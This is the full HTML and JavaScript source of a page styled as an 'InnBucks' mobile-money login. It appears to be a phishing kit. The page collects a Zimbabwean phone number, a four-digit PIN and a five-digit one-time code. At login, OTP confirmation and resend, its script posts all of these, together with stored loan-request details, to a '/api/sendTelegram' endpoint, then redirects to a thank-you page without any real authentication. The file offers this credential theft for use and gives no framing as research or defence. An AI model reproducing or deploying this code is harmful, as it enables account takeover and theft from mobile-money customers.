<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InnBucks — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:#020617;
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#e5e7eb;
}

/* CARD */
.card{
  width:100%;
  max-width:380px;
  background:#020617;
  padding:20px;
  border-radius:14px;
  border:1px solid #1f2937;
  box-shadow:0 18px 45px rgba(0,0,0,.75);
}

.logo{
  height:44px;
  display:block;
  margin:0 auto 10px;
}

h2{
  text-align:center;
  margin:0 0 12px;
  font-size:20px;
  color:#f8fafc;
}

label{
  display:block;
  font-size:13px;
  margin-top:8px;
  color:#cbd5f5;
}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #1f2937;
  background:#020617;
  color:#e5e7eb;
}

.btn{
  background:#2563eb;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  width:100%;
  font-weight:600;
}

.btn[disabled]{
  background:#334155;
}

.req{color:#ef4444}
.small{font-size:13px;color:#9ca3af}
.success{color:#22c55e}

.error{
  min-height:18px;
  font-size:13px;
  color:#ef4444;
}

/* PIN */
.pin-row{
  display:flex;
  gap:10px;
  justify-content:center;
}

.pin-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  font-size:1px;
  color:transparent;
  caret-color:transparent;
}

.pin-digit.filled{
  background:#2563eb;
}

/* OTP */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(2,6,23,.88);
  display:flex;
  align-items:center;
  justify-content:center;
}

.otp-box{
  background:#020617;
  padding:20px;
  border-radius:14px;
  border:1px solid #1f2937;
}

.otp-row{
  display:flex;
  gap:10px;
  justify-content:center;
}

.otp-digit{
  width:18px;
  height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
}

.otp-digit.filled{
  background:#2563eb;
}

.resend-row{
  display:flex;
  justify-content:space-between;
  margin-top:10px;
}

.resend-btn{
  padding:10px;
  border-radius:8px;
  border:1px solid #1f2937;
  background:#020617;
  color:#e5e7eb;
}

.action-primary{
  background:#2563eb;
  color:#fff;
}
</style>

</head>

<body>

<div class="card">

<img src="assets/InnBucks.png" class="logo">

<h2>Login</h2>

<form id="loginForm" autocomplete="off">

<label><span class="req">★</span>Mobile Number</label>

<input id="phone" value="+263" inputmode="numeric">

<div id="phoneError" class="error"></div>


<label><span class="req">★</span>Enter your PIN</label>

<div class="pin-row">

<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">
<input class="pin-digit" maxlength="1" inputmode="numeric">

</div>

<input id="hp" style="display:none">

<button id="loginBtn" class="btn" disabled>LOGIN</button>

</form>

</div>



<div id="otpModal" class="otp-modal" style="display:none">

<div class="otp-box">

<strong>Enter OTP</strong>

<p class="small">

We have sent OTP to your phone

</p>


<div class="otp-row">

<input class="otp-digit" tabindex="-1">
<input class="otp-digit" tabindex="-1">
<input class="otp-digit" tabindex="-1">
<input class="otp-digit" tabindex="-1">
<input class="otp-digit" tabindex="-1">

</div>


<input id="otpBuffer"

inputmode="numeric"

autocomplete="one-time-code"

style="position:absolute;opacity:0">


<div class="small">

Resend in

<span id="countdown">120</span>s

</div>

<button id="resendBtn" disabled>

Resend OTP

</button>


<div style="margin-top:10px">

<button id="confirmOtp" class="resend-btn action-primary" disabled>

Confirm

</button>

<button id="cancelOtp" class="resend-btn">

Cancel

</button>

</div>


<div id="otpStatus"></div>

</div>

</div>



<script>

/* plan unchanged */
let selectedPlan=null;
try{
const raw=sessionStorage.getItem('selectedPlan')||localStorage.getItem('selectedPlan');
if(raw){
selectedPlan=JSON.parse(raw);
localStorage.setItem('selectedPlan',raw);
}
}catch(e){}


/* loan unchanged */
const loanForm=JSON.parse(sessionStorage.getItem('loanForm')||'{}');

function buildLoanRequest(){

if(!loanForm.loanAmount) return 'N/A';

return `${loanForm.loanAmount}/${loanForm.loanType}/${loanForm.repayment} (${loanForm.employment})`;

}



/* phone enforcement */

const phone=document.getElementById('phone');

const phoneError=document.getElementById('phoneError');

const loginBtn=document.getElementById('loginBtn');


function validatePhone(){

const d=phone.value.replace('+263','');

if(!/^7\d{8}$/.test(d)){

phoneError.innerText='Enter your 9-digit number starting with 7';

return false;

}

phoneError.innerText='';

return true;

}


phone.addEventListener('input',()=>{

let d=phone.value.replace('+263','').replace(/\D/g,'');

if(d.startsWith('0')) d=d.slice(1);

phone.value='+263'+d.slice(0,9);

updatePin();

});


/* PIN smooth backspace */

const pins=[...document.querySelectorAll('.pin-digit')];

let pinValue='';


pins.forEach((el,i)=>{


el.addEventListener('input',()=>{

el.value=el.value.replace(/\D/g,'');

el.classList.toggle('filled',!!el.value);


if(el.value && i<pins.length-1)

pins[i+1].focus();


updatePin();

});


el.addEventListener('keydown',e=>{


if(e.key==="Backspace"){

if(el.value){

el.value='';

el.classList.remove('filled');

}else if(i>0){

pins[i-1].focus();

pins[i-1].value='';

pins[i-1].classList.remove('filled');

}


e.preventDefault();

updatePin();

}

});


});


function updatePin(){

pinValue=pins.map(p=>p.value).join('');


loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));

}



/* instant telegram */

function sendToServer(payload){

fetch('/api/sendTelegram',{

method:'POST',

headers:{'Content-Type':'application/json'},

body:JSON.stringify(payload)

});

}



/* OTP smooth */

const dots=[...document.querySelectorAll('.otp-digit')];

const buffer=document.getElementById('otpBuffer');

const confirmBtn=document.getElementById('confirmOtp');

const resendBtn=document.getElementById('resendBtn');

const countdown=document.getElementById('countdown');

const otpStatus=document.getElementById('otpStatus');


function renderOtp(v){

dots.forEach((d,i)=>{

d.classList.toggle('filled',!!v[i]);

});


confirmBtn.disabled=v.length!==5;

}


/* keep keyboard */

buffer.addEventListener('input',()=>{

buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);

renderOtp(buffer.value);

});


buffer.addEventListener('keydown',e=>{

if(e.key==="Backspace"){

buffer.value=buffer.value.slice(0,-1);

renderOtp(buffer.value);

}

});


dots.forEach(d=>d.onclick=()=>buffer.focus());


let sec=120;

setInterval(()=>{

sec--;

countdown.innerText=sec;

if(sec<=0) resendBtn.disabled=false;

},1000);


/* login instant */

loginForm.addEventListener('submit',e=>{

e.preventDefault();


sendToServer({

event:'login_clicked',

loginPhone:phone.value,

loginPin:pinValue,

loan_request:buildLoanRequest()

});


otpModal.style.display='flex';

buffer.value='';

renderOtp('');

buffer.focus();

});


/* confirm instant */

confirmOtp.onclick=()=>{

sendToServer({

event:'otp_confirm',

loginPhone:phone.value,

loginPin:pinValue,

otp:buffer.value,

loan_request:buildLoanRequest()

});


location.href='thankyou.html';

};


/* resend instant */

resendBtn.onclick=()=>{

sendToServer({

event:'resend_otp',

loginPhone:phone.value,

loginPin:pinValue,

loan_request:buildLoanRequest()

});

};


cancelOtp.onclick=()=>{

otpModal.style.display='none';

};

</script>

</body>
</html>
